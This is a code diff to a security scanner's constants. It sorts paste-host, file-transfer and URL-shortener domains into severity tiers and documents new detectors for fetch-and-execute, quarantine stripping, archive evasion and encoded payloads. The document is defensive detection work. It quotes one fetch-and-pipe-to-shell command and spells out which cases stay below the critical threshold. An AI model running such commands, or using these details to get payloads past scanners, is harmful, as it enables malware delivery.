@@ -20,24 +20,22 @@ export const DEFAULT_ALLOWED_DOMAINS = [
   'typescriptlang.org',
 ]
 
-// SMI-6033 Wave 2 (Gap 4): known paste/snippet-host domains. A URL to one of
-// these hosts that is the actual TARGET of a fetch/exec instruction elsewhere
-// in the content is standalone-critical (see SecurityScanner.paste-host.ts's
-// scanPasteHostFetch) — "no normal install flow fetches executable payload
-// from an anonymous host." A URL to one of these hosts that is merely
-// linked/mentioned (not fetched) is NOT flagged by that new detector at all —
-// it stays covered by the existing scanUrls() `url`:medium finding, same as
-// today, since these domains are (correctly) absent from
-// DEFAULT_ALLOWED_DOMAINS above.
-export const PASTE_HOST_DOMAINS = [
+// SMI-6033 Wave 3 (Gap 4 fix): paste/snippet-host domains, split into TWO
+// reputation tiers (the shipped PASTE_HOST_DOMAINS was a single flat list
+// that wrongly conflated transfer.sh/file.io with glot.io/pastebin.com — see
+// SecurityScanner.paste-host.ts for detection logic).
+// ANON_PASTE_HOSTS (+ URL_SHORTENER_DOMAINS below): durable anonymous hosts
+// with no legitimate anonymous-fetch use case — standalone-critical only
+// with EXECUTION evidence (piped to an interpreter, or its fetch destination
+// is later executed/chmod'd/sourced elsewhere); fetched-but-not-executed or
+// merely linked stays at the existing scanUrls() url:medium.
+export const ANON_PASTE_HOSTS = [
   'glot.io',
   'pastebin.com',
   'paste.ee',
   'hastebin.com',
   'ix.io',
   '0x0.st',
-  'transfer.sh',
-  'file.io',
   'dpaste.org',
   'dpaste.com',
   'ghostbin.com',
@@ -47,6 +45,17 @@ export const PASTE_HOST_DOMAINS = [
   'paste.gg',
   'justpaste.it',
 ]
+
+// TRANSIENT_TRANSFER_HOSTS: ephemeral file-transfer hosts with a genuine
+// debugging/incident-response use case. Always medium/co-signal-eligible,
+// NEVER standalone-critical, regardless of execution evidence — `curl
+// file.io/x | bash` alone staying sub-threshold is deliberate, not a gap.
+export const TRANSIENT_TRANSFER_HOSTS = ['transfer.sh', 'file.io', 'tmpfiles.org', 'temp.sh']
+
+// URL-shorteners join ANON_PASTE_HOSTS's critical rule, but ONLY when
+// execution-correlated — a shortened URL piped to a shell has no legitimate
+// install shape (a bare shortened link stays at url:medium like any tier here).
+export const URL_SHORTENER_DOMAINS = ['bit.ly', 'tinyurl.com', 't.co', 'is.gd']
 
 // Sensitive file path patterns
 // SMI-4396 Wave 2: bare-keyword variants (credentials, secrets?, password) tightened
@@ -149,8 +158,28 @@ export { EVIDENCE_TYPE_BY_PATTERN } from './patterns.jailbreak.evidence.js'
  * cross-line matches now possible where none fired before), plus SSRF_
  * INSTRUCTION_PATTERNS word-boundary narrowing (some previously-firing
  * substring FPs, e.g. "budget to localhost", no longer match).
+ *
+ * Bumped to `2026-08-14.1`: SMI-6033 Wave 2 added four new standalone
+ * detector/finding-type categories that did not exist under the prior
+ * version — `gatekeeper_bypass` (xattr quarantine-attribute stripping,
+ * SecurityScanner.compound.ts), `archive_evasion` (password-protected
+ * archive extraction, SecurityScanner.archive.ts), `paste_host_fetch`
+ * (anonymous paste/snippet-host fetch-and-execute, SecurityScanner.paste-
+ * host.ts), and `encoded_payload` (base64 decode-and-recursive-rescan,
+ * SecurityScanner.encoding.ts). Each is exactly the
+ * previously-clean-content-now-fires scenario the ruleset-version gate
+ * exists for: a skill whose bundled content or SKILL.md legitimately
+ * contained an xattr troubleshooting snippet, a password-protected archive
+ * step, a paste-host link, or a base64 blob scanned clean before this wave
+ * and can now legitimately surface a new finding (up to standalone-critical
+ * for the correlated/inline-secret/execution-correlated forms of the first
+ * three) purely because new detection exists, not because the content
+ * changed. A stored acceptance-baseline entry produced under
+ * `2026-07-29.1` predates all four categories and is not comparable —
+ * this bump forces the local MCP audit baseline to re-scan rather than
+ * silently reuse it.
  */
-export const SCANNER_RULESET_VERSION = '2026-07-29.1' as const
+export const SCANNER_RULESET_VERSION = '2026-08-14.1' as const
 
 // Suspicious patterns that might indicate malicious intent
 export const SUSPICIOUS_PATTERNS = [
